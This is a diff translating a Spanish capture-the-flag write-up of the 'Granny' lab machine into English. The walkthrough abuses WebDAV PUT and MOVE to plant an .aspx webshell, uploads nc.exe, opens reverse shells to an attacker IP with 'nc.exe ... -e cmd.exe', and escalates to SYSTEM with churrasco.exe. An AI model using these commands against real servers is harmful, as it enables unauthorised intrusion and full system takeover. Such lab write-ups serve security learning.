@@ -1,6 +1,6 @@
 ﻿# Writeup: Granny
 
->Primero realizamos un escaneo de Nmap de los puertos TCP de la máquina víctima:
+>First, we carried out an Nmap scan of the victim machine's TCP ports:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
@@ -15,7 +15,7 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
 
->Al enviar una **request HTTP** con el método **OPTIONS**, vemos que hay muchos métodos disponibles que son peligrosos como por ejemplo **PUT** y **MOVE**:
+>When sending an **HTTP request** using the **OPTIONS** method, we can see that there are many dangerous methods available, such as **PUT** and **MOVE**:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
@@ -35,7 +35,7 @@ Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARC
 Cache-Control: private
 ```
 
->Usamos **davtest** para ver que extensiones de archivos se pueden subir por **PUT** y vemos que solo se puede **.html** y **.txt**:
+>We use **davtest** to check which file extensions can be uploaded via **PUT**, and we see that only **.html** and **.txt** are allowed:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
@@ -87,7 +87,7 @@ Executes: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.html
 Executes: http://10.129.95.234/DavTestDir_50bdRpImSwI/davtest_50bdRpImSwI.txt
 ```
 
->Pero como tenemos el método **MOVE** podemos subir una **webshell** en **formato .txt**  con el método **PUT** y **cambiarle el nombre** con **MOVE** a **.aspx** para que pueda ejecutarse al ser un IIS:
+>But as we have the **MOVE** method, we can upload a **webshell** in **.txt format** using the **PUT** method and **rename it** using **MOVE** to **.aspx** so that it can be executed as it is an IIS server:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
@@ -101,11 +101,11 @@ dav:/> exit
 Connection to `10.129.95.234' closed.
 ```
 
->Accedemos a la webshell via web:
+>We access the webshell via the web:
 
 <img width="715" height="82" alt="image" src="https://github.com/user-attachments/assets/bad7600b-9b82-44f8-968e-b72b6fedb963" />
 
->Subimos **nc.exe** con el **webdav** empleando la misma metodología anteriormente empleada:
+>We uploaded **nc.exe** via **webdav** using the same method as before:
 
 ```
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
@@ -119,7 +119,7 @@ dav:/> exit
 Connection to `10.129.95.234' closed.
 ```
 
->Enviamos este payload por la **webshell** y recibimos una **reverse shell**:
+>We sent this payload via the **webshell** and received a **reverse shell**:
 
 ```bash
 c:\inetpub\wwwroot\nc.exe 10.10.14.71 443 -e cmd.exe
@@ -136,7 +136,7 @@ Microsoft Windows [Version 5.2.3790]
 c:\windows\system32\inetsrv>
 ```
 
->Vemos el token **SeImpersonatePrivilege** en el usuario que estamos empleando y está habilitado así que podemos escalar privilegios con esto:
+>We can see the **SeImpersonatePrivilege** token for the user we are using, and it is enabled, so we can escalate privileges using this:
 
 ```bash
 c:\windows\system32\inetsrv>whoami /priv
@@ -155,13 +155,13 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 ```
 
->Subimos **churrasco.exe** ya que es un Windows Server bastante antiguo y escalamos privilegios con esto para ejecutar una reverse shell como **SYSTEM**:
+>We uploaded **churrasco.exe** as it is a fairly old Windows Server, and we used this to escalate privileges in order to run a reverse shell as **SYSTEM**:
 
 ```powershell
 C:\Inetpub\wwwroot>.\churrasco.exe "C:\Inetpub\wwwroot\nc.exe 10.10.14.71 4444 -e cmd.exe"
 ```
 
->Recibimos la shell y ya hemos escalado a **SYSTEM**, comprometiendo por completo la máquina:
+>We've gained a shell and have now escalated to **SYSTEM**, completely compromising the machine:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/granny]
